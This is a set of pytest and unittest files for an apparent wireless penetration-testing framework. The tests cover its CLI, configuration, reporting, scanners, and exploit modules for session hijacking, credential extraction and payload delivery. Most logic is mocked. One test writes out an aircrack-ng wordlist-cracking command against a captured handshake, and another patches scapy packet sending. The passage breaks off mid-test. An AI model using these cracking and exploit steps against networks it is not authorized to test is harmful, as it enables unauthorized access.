from core.config_manager import ConfigManager, ConfigModel
from project_specifc_utils.network_interface_manager import NetworkInterfaceManager

import os
import json
import pytest
import yaml
from click.testing import CliRunner

from project_specifc_utils.network_interface_manager import NetworkInterfaceManager
from project_specifc_utils.data_storage_manager import DataStorageManager
from project_specifc_utils.authentication_tools import AuthenticationTools
from core import CoreFramework
from scanners.encryption_scanner import EncryptionWeaknessScanner
from scanners.auth_bypass_scanner import AuthBypassScanner
from scanners.dos_scanner import DosScanner
from scanners.local_scanner import LocalScanner
from exploits.session_hijacking import SessionHijacking
from exploits.credential_extraction import CredentialExtraction
from exploits.payload_delivery import PayloadDelivery
from ui.cli import cli

# =========================================
# Fixtures
# =========================================

@pytest.fixture
def sample_config(tmp_path):
    config_content = {
        'general': {
            'interface': 'wlan0mon',
            'report_directory': 'reports',
            'log_level': 'INFO',
        },
        'scanners': {
            'encryption_scanner': {'scan_duration': 10},
            'auth_bypass_scanner': {'scan_duration': 15},
            'dos_scanner': {'scan_duration': 5},
            'local_scanner': {
                'scan_duration': 8,
                'interface': 'wlan0mon',
                'vendor_lookup': True
            },
        },
        'exploits': {
            'session_hijacking': {'max_packets': 100},
            'credential_extraction': {},
            'payload_delivery': {
                'payload_types': ['type1', 'type2'],
                'default_duration': 30
            },
        },
        'ui': {
            'theme': 'dark'
        }
    }

    config_dir = tmp_path / "config"
    config_dir.mkdir(parents=True, exist_ok=True)
    config_file = config_dir / "config.yaml"

    with open(config_file, 'w') as f:
        yaml.dump(config_content, f)

    return config_dir

@pytest.fixture
def mock_vulnerabilities(tmp_path):
    vulnerabilities_dir = tmp_path / "vulnerabilities"
    vulnerabilities_dir.mkdir(parents=True, exist_ok=True)
    vulnerabilities_file = vulnerabilities_dir / "vulnerabilities.json"
    vulnerabilities_content = {
        "Vuln1": ["Issue1", "Issue2"],
        "Vuln2": ["Issue3"]
    }
    with open(vulnerabilities_file, 'w') as f:
        json.dump(vulnerabilities_content, f)
    return vulnerabilities_file

@pytest.fixture
def core_framework(sample_config, mock_vulnerabilities):
    config_dir = sample_config
    modules_path = config_dir / "modules"  # Adjust this path as needed

    # Create dummy modules directory
    modules_path.mkdir(parents=True, exist_ok=True)

    core = CoreFramework(
        modules_path=str(modules_path),
        config_dir=str(config_dir),
        vulnerabilities_path=str(mock_vulnerabilities)
    )
    return core

@pytest.fixture
def runner():
    return CliRunner()

# =========================================
# Tests
# =========================================

def test_config_manager_loads_config(sample_config):
    from core.config_manager import ConfigManager
    config_manager = ConfigManager(config_dir=str(sample_config))
    config = config_manager.get_config()

    assert config.general.interface == 'wlan0mon'
    assert config.general.report_directory == 'reports'
    assert config.general.log_level == 'INFO'
    assert config.scanners.encryption_scanner.scan_duration == 10
    assert config.exploits.session_hijacking.max_packets == 100
    # Update other assertions as needed


def test_network_interface_invalid_interface():
    with pytest.raises(ValueError):
        NetworkInterfaceManager(interface='invalid_interface')

def test_data_storage_manager_initialization(tmp_path):
    report_dir = tmp_path / "reports"
    manager = DataStorageManager(report_directory=str(report_dir))
    assert manager.report_directory == str(report_dir)
    assert os.path.exists(manager.report_directory)

def test_generate_report(tmp_path):
    report_dir = tmp_path / "reports"
    manager = DataStorageManager(report_directory=str(report_dir))
    vulnerability_db = {"Vuln1": ["Issue1", "Issue2"], "Vuln2": ["Issue3"]}
    manager.generate_report(vulnerability_db)
    report_file = os.path.join(manager.report_directory, "report.json")
    assert os.path.exists(report_file)

    # Verify content of the report
    with open(report_file, 'r') as f:
        data = json.load(f)
        assert data == vulnerability_db

def test_authentication_process(mocker):
    auth = AuthenticationTools()
    # Ensure the 'authenticate' method exists
    assert hasattr(auth, 'authenticate')

    # Mock the 'authenticate' method
    mocker.patch.object(auth, 'authenticate', return_value=True)
    result = auth.authenticate()
    assert result == True

def test_auth_bypass_scanner(core_framework):
    scanner = AuthBypassScanner(core_framework=core_framework, scan_duration=15)
    target_info = {'ssid': 'TestSSID', 'bssid': 'AA:BB:CC:DD:EE:FF'}
    vulnerabilities = scanner.scan(target_info)
    assert isinstance(vulnerabilities, dict)
    # Add further assertions as needed

def test_dos_scanner(core_framework):
    scanner = DosScanner(core_framework=core_framework, scan_duration=5)
    target_info = {'ssid': 'TestSSID', 'bssid': 'AA:BB:CC:DD:EE:FF'}
    vulnerabilities = scanner.scan(target_info)
    assert isinstance(vulnerabilities, dict)
    # Add further assertions as needed

def test_local_scanner(core_framework):
    scanner = LocalScanner(
        core_framework=core_framework,
        scan_duration=8,
        interface='wlan0mon',
        vendor_lookup=True
    )
    target_info = {'ssid': 'TestSSID', 'bssid': 'AA:BB:CC:DD:EE:FF'}
    vulnerabilities = scanner.scan(target_info)
    assert isinstance(vulnerabilities, dict)
    # Add further assertions as needed

def test_credential_extraction(core_framework):
    vulnerability = {'Vuln2': ['Issue3']}
    exploit = CredentialExtraction(core_framework=core_framework, vulnerability=vulnerability)
    result = exploit.execute()
    assert isinstance(result, dict)
    # Add further assertions as needed

def test_payload_delivery(core_framework):
    vulnerability = {'Vuln3': ['Issue4']}
    exploit = PayloadDelivery(core_framework=core_framework, vulnerability=vulnerability)
    result = exploit.execute()
    assert isinstance(result, dict)
    # Add further assertions as needed

def test_cli_list_command(runner, sample_config, mock_vulnerabilities, tmp_path, monkeypatch):
    config_dir = sample_config

    # Initialize CoreFramework within the CLI context
    def mock_initialize_coreframework(*args, **kwargs):
        return CoreFramework(
            modules_path=str(config_dir / "modules"),
            config_dir=str(config_dir),
            vulnerabilities_path=str(mock_vulnerabilities)
        )

    # Monkeypatch the 'initialize_coreframework' function in 'cli' module
    monkeypatch.setattr('ui.cli.initialize_coreframework', mock_initialize_coreframework)

    result = runner.invoke(cli, ['list'])

    assert result.exit_code == 0
    assert "Available Scanners:" in result.output
    # Add further assertions based on expected output

def test_cli_report_command(runner, sample_config, mock_vulnerabilities, tmp_path, monkeypatch):
    config_dir = sample_config

    # Initialize CoreFramework within the CLI context
    def mock_initialize_coreframework(*args, **kwargs):
        return CoreFramework(
            modules_path=str(config_dir / "modules"),
            config_dir=str(config_dir),
            vulnerabilities_path=str(mock_vulnerabilities)
        )

    # Monkeypatch the 'initialize_coreframework' function in 'cli' module
    monkeypatch.setattr('ui.cli.initialize_coreframework', mock_initialize_coreframework)

    result = runner.invoke(cli, ['report'])

    assert result.exit_code == 0
    assert "Generating report..." in result.output
    # Verify that the report file exists
    report_dir = config_dir / "reports"
    report_file = report_dir / "report.json"
    assert os.path.exists(report_file)
    # Add further assertions based on expected output


# tests/test_all.py
# tests/test_all.py

import pytest
from unittest.mock import MagicMock, patch, call
from click.testing import CliRunner
import os
import sys
import json
import logging


# ============================
# Fixtures for Mocking
# ============================

@pytest.fixture
def mock_coreframework(mocker):
    """
    Fixture to mock the CoreFramework class used in cli.py.
    Returns the mock instance to allow test functions to configure it as needed.
    """
    # Patch 'core.CoreFramework' to return a mock instance
    mock_coreframework_class = mocker.patch('core.CoreFramework', autospec=True)

    # Create a mock instance of CoreFramework
    mock_coreframework_instance = MagicMock()

    # Assign the mock instance to be returned when CoreFramework() is called
    mock_coreframework_class.return_value = mock_coreframework_instance

    # Initialize vulnerability_db as a real dict
    mock_coreframework_instance.vulnerability_db = {}

    # Initialize scanners and exploits
    mock_coreframework_instance.scanners = {}
    mock_coreframework_instance.exploits = {}

    # Initialize config_manager
    mock_coreframework_instance.config_manager = MagicMock()
    mock_coreframework_instance.config_manager.config_dir = '/path/to/config'
    mock_coreframework_instance.config_manager.get_config.return_value = MagicMock()

    return mock_coreframework_instance


@pytest.fixture
def mock_cli_main(mocker):
    """
    Fixture to mock the cli object from ui.cli for main.py tests.
    """
    return mocker.patch('main.cli')


@pytest.fixture
def mock_sys_exit(mocker):
    """
    Fixture to mock sys.exit to prevent the test runner from exiting.
    """
    return mocker.patch('sys.exit')


# ============================
# Tests for cli.py
# ============================

def test_scan_command_runs_scanner(mocker, mock_coreframework, caplog):
    """
    Test that the 'scan' command successfully runs the specified scanner
    and outputs the expected messages.
    """
    # Configure the mock scanners
    mock_scanner = MagicMock()

    # Mock the run_scanner method to simulate scanner behavior
    def mock_run_scanner(scanner_name, target_info):
        vulnerabilities = {'vuln1': [{'detail': 'Sample vulnerability'}]}
        # Do NOT update vulnerability_db here to prevent duplication
        return vulnerabilities

    mock_coreframework.run_scanner.side_effect = mock_run_scanner

    # Mock 'scanners' dictionary
    mock_coreframework.scanners = {
        'encryption_scanner': mock_scanner
    }

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, [
        'scan',
        '--target-ssid', 'TestSSID',
        '--target-bssid', 'AA:BB:CC:DD:EE:FF',
        '--scanner', 'encryption_scanner'
    ])

    # Assert exit code
    assert result.exit_code == 0

    # Assert output contains expected messages
    expected_message_1 = "Running scanner: encryption_scanner"
    expected_message_2 = "All specified scans have been executed."

    # Check if the messages are in the output or in the captured logs
    assert expected_message_1 in result.output or expected_message_1 in caplog.text
    assert expected_message_2 in result.output or expected_message_2 in caplog.text

    # Assert that run_scanner was called with correct arguments
    mock_coreframework.run_scanner.assert_called_once_with(
        'encryption_scanner',
        {'ssid': 'TestSSID', 'bssid': 'AA:BB:CC:DD:EE:FF'}
    )

    # Assert that vulnerabilities were added to vulnerability_db
    assert mock_coreframework.vulnerability_db == {
        'vuln1': [{'detail': 'Sample vulnerability'}]
    }


def test_scan_command_without_scanners_shows_available_scanners(mocker, mock_coreframework, caplog):
    """
    Test that the 'scan' command without specifying scanners
    lists available scanners and exits with code 1.
    """
    # Configure the mock scanners
    mock_coreframework.scanners = {
        'encryption_scanner': MagicMock(),
        'auth_bypass_scanner': MagicMock()
    }

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, [
        'scan',
        '--target-ssid', 'TestSSID',
        '--target-bssid', 'AA:BB:CC:DD:EE:FF'
    ])

    # Assert exit code
    assert result.exit_code == 1

    # Assert output contains expected messages
    expected_output_start = "No scanners specified. Available scanners are:"
    expected_scanner_1 = "- encryption_scanner"
    expected_scanner_2 = "- auth_bypass_scanner"

    assert expected_output_start in result.output or expected_output_start in caplog.text
    assert expected_scanner_1 in result.output or expected_scanner_1 in caplog.text
    assert expected_scanner_2 in result.output or expected_scanner_2 in caplog.text


def test_exploit_command_without_exploits_shows_available_exploits(mocker, mock_coreframework, caplog):
    """
    Test that the 'exploit' command without specifying exploits
    lists available exploits and exits with code 1.
    """
    # Configure the mock exploits
    mock_coreframework.exploits = {
        'session_hijacking': MagicMock(),
        'credential_extraction': MagicMock()
    }

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, [
        'exploit',
        '--target-ssid', 'TestSSID',
        '--target-bssid', 'AA:BB:CC:DD:EE:FF'
    ])

    # Assert exit code
    assert result.exit_code == 1

    # Assert output contains expected messages
    expected_output_start = "No exploits specified. Available exploits are:"
    expected_exploit_1 = "- session_hijacking"
    expected_exploit_2 = "- credential_extraction"

    assert expected_output_start in result.output or expected_output_start in caplog.text
    assert expected_exploit_1 in result.output or expected_exploit_1 in caplog.text
    assert expected_exploit_2 in result.output or expected_exploit_2 in caplog.text


def test_configure_command_shows_current_configuration(mocker, mock_coreframework, caplog):
    """
    Test that the 'configure' command without settings
    displays the current configuration.
    """
    # Mock the config_manager and its get_config method
    mock_config = MagicMock()
    mock_config.general.interface = 'wlan0mon'
    mock_config.general.report_directory = '/path/to/reports'
    mock_coreframework.config_manager.get_config.return_value = mock_config

    # Mock os.path.exists to simulate that config.yaml exists
    mocker.patch('os.path.exists', return_value=True)

    # Mock the open function to return a sample configuration
    mocker.patch('builtins.open', mocker.mock_open(read_data="general:\n  interface: wlan0mon\n"))

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['configure'])

    # Assert exit code
    assert result.exit_code == 0

    # Assert output contains expected configuration
    expected_output_1 = "Current Configuration:"
    expected_output_2 = "[general]"
    expected_output_3 = "interface: wlan0mon"

    assert expected_output_1 in result.output or expected_output_1 in caplog.text
    assert expected_output_2 in result.output or expected_output_2 in caplog.text
    assert expected_output_3 in result.output or expected_output_3 in caplog.text


def test_report_command_generates_json_report(mocker, mock_coreframework, caplog):
    """
    Test that the 'report' command with '--format json'
    generates a JSON report at the specified location.
    """
    # Configure the mock report_directory
    mock_coreframework.config_manager.config.report_directory = '/path/to/reports'

    # Mock the vulnerability_db
    mock_coreframework.vulnerability_db = {
        'scan1': [{
            'ssid': 'TestSSID',
            'bssid': 'AA:BB:CC:DD:EE:FF',
            'protocol': 'WPA2',
            'description': 'Weak encryption'
        }]
    }

    # Mock os.makedirs to prevent actual directory creation
    mocker.patch('os.makedirs')

    # Mock the open function for writing the JSON report
    mock_open_write = mocker.mock_open()
    mocker.patch('builtins.open', mock_open_write)

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['report', '--format', 'json'])

    # Assert exit code
    assert result.exit_code == 0

    # Construct expected path with os.path.normpath
    expected_path = os.path.normpath('/path/to/reports/json/report.json')

    # Assert output contains expected message
    expected_message = f"JSON report exported to {expected_path}"
    assert expected_message in result.output or expected_message in caplog.text

    # Assert that the report was written correctly
    mock_open_write.assert_called_once_with(expected_path, 'w')
    handle = mock_open_write()
    expected_report = {
        'scans': {
            'scan1': [{
                'ssid': 'TestSSID',
                'bssid': 'AA:BB:CC:DD:EE:FF',
                'protocol': 'WPA2',
                'description': 'Weak encryption'
            }]
        },
        'exploits': {}
    }
    # Concatenate all write calls
    written_data = ''.join(call.args[0] for call in handle.write.call_args_list)
    assert written_data == json.dumps(expected_report, indent=4)


def test_report_command_generates_txt_report(mocker, mock_coreframework, caplog):
    """
    Test that the 'report' command with '--format txt'
    generates a TXT report at the specified location.
    """
    # Configure the mock report_directory
    mock_coreframework.config_manager.config.report_directory = '/path/to/reports'

    # Mock the vulnerability_db
    mock_coreframework.vulnerability_db = {
        'scan1': [{
            'ssid': 'TestSSID',
            'bssid': 'AA:BB:CC:DD:EE:FF',
            'protocol': 'WPA2',
            'description': 'Weak encryption'
        }],
        'exploit1': [{
            'bssid': 'AA:BB:CC:DD:EE:FF',
            'description': 'Credential extraction successful',
            'action': 'Extracted credentials'
        }]
    }

    # Mock os.makedirs to prevent actual directory creation
    mocker.patch('os.makedirs')

    # Mock the open function for writing the TXT report
    mock_open_write = mocker.mock_open()
    mocker.patch('builtins.open', mock_open_write)

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['report', '--format', 'txt'])

    # Assert exit code
    assert result.exit_code == 0

    # Construct expected path with os.path.normpath
    expected_path = os.path.normpath('/path/to/reports/txt/report.txt')

    # Assert output contains expected message
    expected_message = f"TXT report exported to {expected_path}"
    assert expected_message in result.output or expected_message in caplog.text

    # Assert that the report was written correctly
    mock_open_write.assert_called_once_with(expected_path, 'w')
    handle = mock_open_write()

    # Construct expected report with OS-specific line separators
    expected_report = (
        f"Scanner: scan1{os.linesep}"
        f"  - SSID: TestSSID{os.linesep}"
        f"    BSSID: AA:BB:CC:DD:EE:FF{os.linesep}"
        f"    Protocol: WPA2{os.linesep}"
        f"    Description: Weak encryption{os.linesep}"
        f"Exploit: exploit1{os.linesep}"
        f"  - BSSID: AA:BB:CC:DD:EE:FF{os.linesep}"
        f"    Description: Credential extraction successful{os.linesep}"
        f"    Action: Extracted credentials{os.linesep}"
    )

    # Concatenate all write calls
    written_data = ''.join(call.args[0] for call in handle.write.call_args_list)

    # Normalize line endings for comparison
    written_data_normalized = written_data.replace('\r\n', '\n')
    expected_report_normalized = expected_report.replace('\r\n', '\n')

    assert written_data_normalized == expected_report_normalized


def test_list_command_shows_available_scanners_and_exploits(mocker, mock_coreframework, caplog):
    """
    Test that the 'list' command displays all available scanners and exploits.
    """
    # Configure the mock scanners and exploits
    mock_coreframework.scanners = {
        'encryption_scanner': MagicMock(),
        'auth_bypass_scanner': MagicMock()
    }
    mock_coreframework.exploits = {
        'session_hijacking': MagicMock(),
        'credential_extraction': MagicMock()
    }

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['list'])

    # Assert exit code
    assert result.exit_code == 0

    # Assert output contains available scanners
    expected_scanners_header = "\nAvailable Scanners:"
    expected_scanner_1 = "- encryption_scanner"
    expected_scanner_2 = "- auth_bypass_scanner"

    assert expected_scanners_header in result.output or expected_scanners_header in caplog.text
    assert expected_scanner_1 in result.output or expected_scanner_1 in caplog.text
    assert expected_scanner_2 in result.output or expected_scanner_2 in caplog.text

    # Assert output contains available exploits
    expected_exploits_header = "\nAvailable Exploits:"
    expected_exploit_1 = "- session_hijacking"
    expected_exploit_2 = "- credential_extraction"

    assert expected_exploits_header in result.output or expected_exploits_header in caplog.text
    assert expected_exploit_1 in result.output or expected_exploit_1 in caplog.text
    assert expected_exploit_2 in result.output or expected_exploit_2 in caplog.text


# ============================
# Tests for main.py
# ============================

def test_main_successful_invocation(mocker, mock_cli_main, mock_sys_exit, caplog):
    """
    Test that main() successfully invokes the CLI without errors.
    """
    # Arrange
    # Ensure that cli(obj={}) runs without raising an exception
    mock_cli_main.return_value = None  # cli returns nothing (equivalent to sys.exit(0))

    # Act
    from main import main
    main()

    # Assert
    mock_cli_main.assert_called_once_with(obj={})
    mock_sys_exit.assert_not_called()

    # Optionally, check that logging.info was called during setup
    # Since setup_logging sets up a console handler, we can check for initialization logs
    # However, since no log messages are generated in main(), we skip this


def test_main_cli_raises_exception(mocker, mock_cli_main, mock_sys_exit, caplog):
    """
    Test that if cli(obj={}) raises an exception, main() logs the error and exits with code 1.
    """
    # Arrange
    test_exception = Exception("Test CLI Exception")
    mock_cli_main.side_effect = test_exception

    # Act
    from main import main
    main()

    # Assert
    mock_cli_main.assert_called_once_with(obj={})
    mock_sys_exit.assert_called_once_with(1)

    # Check that the error was logged
    assert f"An error occurred while running the CLI: {test_exception}" in caplog.text


def test_main_logging_setup(mocker, caplog):
    """
    Test that the logging is set up correctly in main().
    """
    # Arrange
    with patch('main.cli') as mock_cli_main, \
            patch('sys.exit') as mock_sys_exit:
        # Reset the logger to remove any existing handlers
        logger = logging.getLogger()
        logger.handlers = []
        logger.setLevel(logging.NOTSET)

        # Act
        from main import main
        main()

    # Assert
    # Check that logging has at least one handler
    assert len(logger.handlers) >= 1

    # Check that the root logger level is set to DEBUG
    assert logger.level == logging.DEBUG

    # Check the formatter of the console handler
    console_handler = None
    for handler in logger.handlers:
        if isinstance(handler, logging.StreamHandler):
            console_handler = handler
            break
    assert console_handler is not None, "No StreamHandler found in logger handlers."

    expected_format = '[%(asctime)s] %(levelname)s - %(name)s - %(message)s'
    assert console_handler.formatter._fmt == expected_format


def test_main_logging_error_on_exception(mocker, mock_cli_main, mock_sys_exit, caplog):
    """
    Test that if cli(obj={}) raises an exception, the error is logged correctly.
    """
    # Arrange
    test_exception = ValueError("Invalid value provided")
    mock_cli_main.side_effect = test_exception

    # Act
    from main import main
    main()

    # Assert
    mock_sys_exit.assert_called_once_with(1)
    # Check that the error message is logged
    assert f"An error occurred while running the CLI: {test_exception}" in caplog.text


# ============================
# Entry Point for Running Tests
# ============================

if __name__ == '__main__':
    pytest.main(['-v', 'test_all.py'])


# tests/test_authentication_tools.py
import unittest
from unittest.mock import patch, MagicMock
from project_specifc_utils.authentication_tools import AuthenticationTools
import subprocess
import os
import logging


class TestAuthenticationTools(unittest.TestCase):
    def setUp(self):
        # Set up the logger to capture log outputs for assertions
        self.logger = logging.getLogger('AuthenticationTools')
        self.logger.setLevel(logging.DEBUG)
        self.auth_tools = AuthenticationTools()

    @patch('project_specifc_utils.authentication_tools.subprocess.run')
    def test_decrypt_handshake_success(self, mock_run):
        # Mock successful decryption with aircrack-ng
        mock_run.return_value = subprocess.CompletedProcess(
            args=['aircrack-ng', '-w', 'wordlist.txt', '-l', 'password.txt', 'handshake.cap'],
            returncode=0,
            stdout='KEY FOUND! [password]',
            stderr=''
        )

        result = self.auth_tools.decrypt_handshake('handshake.cap', 'wordlist.txt', 'password.txt')
        self.assertTrue(result)
        mock_run.assert_called_once_with(['aircrack-ng', '-w', 'wordlist.txt', '-l', 'password.txt', 'handshake.cap'],
                                         check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    @patch('project_specifc_utils.authentication_tools.subprocess.run')
    def test_decrypt_handshake_failure_no_key(self, mock_run):
        # Mock decryption attempt with no key found
        mock_run.return_value = subprocess.CompletedProcess(
            args=['aircrack-ng', '-w', 'wordlist.txt', '-l', 'password.txt', 'handshake.cap'],
            returncode=0,
            stdout='No keys found.',
            stderr=''
        )

        result = self.auth_tools.decrypt_handshake('handshake.cap', 'wordlist.txt', 'password.txt')
        self.assertFalse(result)
        mock_run.assert_called_once_with(['aircrack-ng', '-w', 'wordlist.txt', '-l', 'password.txt', 'handshake.cap'],
                                         check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    @patch('project_specifc_utils.authentication_tools.subprocess.run')
    def test_decrypt_handshake_command_error(self, mock_run):
        # Mock aircrack-ng command failure
        mock_run.side_effect = subprocess.CalledProcessError(
            returncode=1,
            cmd=['aircrack-ng', '-w', 'wordlist.txt', '-l', 'password.txt', 'handshake.cap'],
            stderr='Aircrack-ng failed to open handshake file.'
        )

        result = self.auth_tools.decrypt_handshake('handshake.cap', 'wordlist.txt', 'password.txt')
        self.assertFalse(result)
        mock_run.assert_called_once_with(['aircrack-ng', '-w', 'wordlist.txt', '-l', 'password.txt', 'handshake.cap'],
                                         check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Additional tests for generate_pmkid can be added similarly


if __name__ == '__main__':
    unittest.main()


# tests/test_auth_bypass_scanner.py
import unittest
from unittest.mock import MagicMock, patch
from scanners.auth_bypass_scanner import AuthBypassScanner

class TestAuthBypassScanner(unittest.TestCase):
    def setUp(self):
        self.core_framework = MagicMock()
        self.scanner = AuthBypassScanner(self.core_framework, scan_duration=5)
        self.target = {'bssid': '00:11:22:33:44:55'}

    @patch('scapy.all.sniff')
    @patch('scapy.all.sendp')
    def starts_scan_and_detects_vulnerability(self, mock_sendp, mock_sniff):
        mock_sniff.return_value = []
        self.scanner.scan(self.target)
        self.assertTrue(self.scanner.detected_vulnerabilities)
        self.assertIn('AUTH_BYPASS', self.core_framework.vulnerability_db)

    @patch('scapy.all.sniff')
    @patch('scapy.all.sendp')
    def starts_scan_and_detects_no_vulnerability(self, mock_sendp, mock_sniff):
        mock_sniff.return_value = [MagicMock()]
        self.scanner.scan(self.target)
        self.assertFalse(self.scanner.detected_vulnerabilities)
        self.assertNotIn('AUTH_BYPASS', self.core_framework.vulnerability_db)

    def does_not_start_scan_without_bssid(self):
        self.scanner.scan({})
        self.assertFalse(self.scanner.detected_vulnerabilities)
        self.core_framework.send_continuous_packets.assert_not_called()

    def generates_report_with_vulnerabilities(self):
        self.scanner.detected_vulnerabilities = [{'bssid': '00:11:22:33:44:55', 'description': 'Test', 'action': 'Test action'}]
        with patch('builtins.print') as mock_print:
            self.scanner.report()
            mock_print.assert_called()

    def generates_report_without_vulnerabilities(self):
        self.scanner.detected_vulnerabilities = []
        with patch('builtins.print') as mock_print:
            self.scanner.report()
            mock_print.assert_not_called()

    def finalizes_scan(self):
        self.scanner.finalize()
        self.core_framework.stop_continuous_packets.assert_called()



# tests/test_cli.py
# tests/test_cli.py

import pytest
from click.testing import CliRunner
from unittest.mock import MagicMock
import os
import json


@pytest.fixture
def mock_coreframework(mocker):
    """
    Fixture to mock the CoreFramework class used in cli.py.
    Returns the mock instance to allow test functions to configure it as needed.
    """
    # Step 1: Patch 'core.CoreFramework' to return a mock instance
    mock_coreframework_class = mocker.patch('core.CoreFramework')

    # Step 2: Create a mock instance of CoreFramework
    mock_coreframework_instance = MagicMock()

    # Step 3: Assign the mock instance to be returned when CoreFramework() is called
    mock_coreframework_class.return_value = mock_coreframework_instance

    return mock_coreframework_instance


def test_scan_command_runs_scanner(mocker, mock_coreframework):
    """
    Test that the 'scan' command successfully runs the specified scanner
    and outputs the expected messages.
    """
    # Configure the mock scanners
    mock_scanner = MagicMock()
    mock_scanner.scan.return_value = {'vuln1': [{'detail': 'Sample vulnerability'}]}
    mock_coreframework.scanners = {'encryption_scanner': mock_scanner}

    # Initialize vulnerability_db
    mock_coreframework.vulnerability_db = {}

    # Mock the run_scanner method to simulate scanner behavior
    def mock_run_scanner(scanner_name, target_info):
        vulnerabilities = {'vuln1': [{'detail': 'Sample vulnerability'}]}
        mock_coreframework.vulnerability_db.update(vulnerabilities)
        return vulnerabilities

    mock_coreframework.run_scanner.side_effect = mock_run_scanner

    # Ensure load_protocol_modules is called during initialization
    mock_coreframework.load_protocol_modules = MagicMock()

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, [
        'scan',
        '--target-ssid', 'TestSSID',
        '--target-bssid', 'AA:BB:CC:DD:EE:FF',
        '--scanner', 'encryption_scanner'
    ])

    # Assert exit code
    assert result.exit_code == 0

    # Assert output contains expected messages
    assert "Running scanner: encryption_scanner" in result.output
    assert "All specified scans have been executed." in result.output

    # Assert that run_scanner was called with correct arguments
    mock_coreframework.run_scanner.assert_called_once_with(
        'encryption_scanner',
        {'ssid': 'TestSSID', 'bssid': 'AA:BB:CC:DD:EE:FF'}
    )

    # Assert that vulnerabilities were added to vulnerability_db
    assert mock_coreframework.vulnerability_db == {
        'vuln1': [{'detail': 'Sample vulnerability'}]
    }


def test_scan_command_without_scanners_shows_available_scanners(mocker, mock_coreframework):
    """
    Test that the 'scan' command without specifying scanners
    lists available scanners and exits with code 1.
    """
    # Configure the mock scanners
    mock_coreframework.scanners = {
        'encryption_scanner': MagicMock(),
        'auth_bypass_scanner': MagicMock()
    }

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, [
        'scan',
        '--target-ssid', 'TestSSID',
        '--target-bssid', 'AA:BB:CC:DD:EE:FF'
    ])

    # Assert exit code
    assert result.exit_code == 1

    # Assert output contains expected messages
    assert "No scanners specified. Available scanners are:" in result.output
    assert "- encryption_scanner" in result.output
    assert "- auth_bypass_scanner" in result.output


def test_exploit_command_without_exploits_shows_available_exploits(mocker, mock_coreframework):
    """
    Test that the 'exploit' command without specifying exploits
    lists available exploits and exits with code 1.
    """
    # Configure the mock exploits
    mock_coreframework.exploits = {
        'session_hijacking': MagicMock(),
        'credential_extraction': MagicMock()
    }

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, [
        'exploit',
        '--target-ssid', 'TestSSID',
        '--target-bssid', 'AA:BB:CC:DD:EE:FF'
    ])

    # Assert exit code
    assert result.exit_code == 1

    # Assert output contains expected messages
    assert "No exploits specified. Available exploits are:" in result.output
    assert "- session_hijacking" in result.output
    assert "- credential_extraction" in result.output


def test_configure_command_shows_current_configuration(mocker, mock_coreframework):
    """
    Test that the 'configure' command without settings
    displays the current configuration.
    """
    # Mock the config_manager and its get_config method
    mock_config = MagicMock()
    mock_config.general.interface = 'wlan0mon'
    mock_config.general.report_directory = '/path/to/reports'
    mock_coreframework.config_manager.config_dir = '/path/to/config'
    mock_coreframework.config_manager.get_config.return_value = mock_config

    # Mock os.path.exists to simulate that config.yaml exists
    mocker.patch('os.path.exists', return_value=True)

    # Mock the open function to return a sample configuration
    mocker.patch('builtins.open', mocker.mock_open(read_data="general:\n  interface: wlan0mon\n"))

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['configure'])

    # Assert exit code
    assert result.exit_code == 0

    # Assert output contains expected configuration
    assert "Current Configuration:" in result.output
    assert "[general]" in result.output
    assert "interface: wlan0mon" in result.output


def test_report_command_generates_json_report(mocker, mock_coreframework):
    """
    Test that the 'report' command with '--format json'
    generates a JSON report at the specified location.
    """
    # Configure the mock report_directory
    mock_coreframework.config_manager.config.report_directory = '/path/to/reports'

    # Mock the vulnerability_db
    mock_coreframework.vulnerability_db = {
        'scan1': [{
            'ssid': 'TestSSID',
            'bssid': 'AA:BB:CC:DD:EE:FF',
            'protocol': 'WPA2',
            'description': 'Weak encryption'
        }]
    }

    # Mock os.makedirs to prevent actual directory creation
    mocker.patch('os.makedirs')

    # Mock the open function for writing the JSON report
    mock_open_write = mocker.mock_open()
    mocker.patch('builtins.open', mock_open_write)

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['report', '--format', 'json'])

    # Assert exit code
    assert result.exit_code == 0

    # Construct expected path with os.path.normpath
    expected_path = os.path.normpath('/path/to/reports/json/report.json')

    # Assert output contains expected message
    expected_message = f"JSON report exported to {expected_path}"
    assert expected_message in result.output

    # Assert that the report was written correctly
    mock_open_write.assert_called_once_with(expected_path, 'w')
    handle = mock_open_write()
    expected_report = {
        'scans': {
            'scan1': [{
                'ssid': 'TestSSID',
                'bssid': 'AA:BB:CC:DD:EE:FF',
                'protocol': 'WPA2',
                'description': 'Weak encryption'
            }]
        },
        'exploits': {}
    }
    handle.write.assert_called_once_with(json.dumps(expected_report, indent=4))


def test_report_command_generates_txt_report(mocker, mock_coreframework):
    """
    Test that the 'report' command with '--format txt'
    generates a TXT report at the specified location.
    """
    # Configure the mock report_directory
    mock_coreframework.config_manager.config.report_directory = '/path/to/reports'

    # Mock the vulnerability_db
    mock_coreframework.vulnerability_db = {
        'scan1': [{
            'ssid': 'TestSSID',
            'bssid': 'AA:BB:CC:DD:EE:FF',
            'protocol': 'WPA2',
            'description': 'Weak encryption'
        }],
        'exploit1': [{
            'bssid': 'AA:BB:CC:DD:EE:FF',
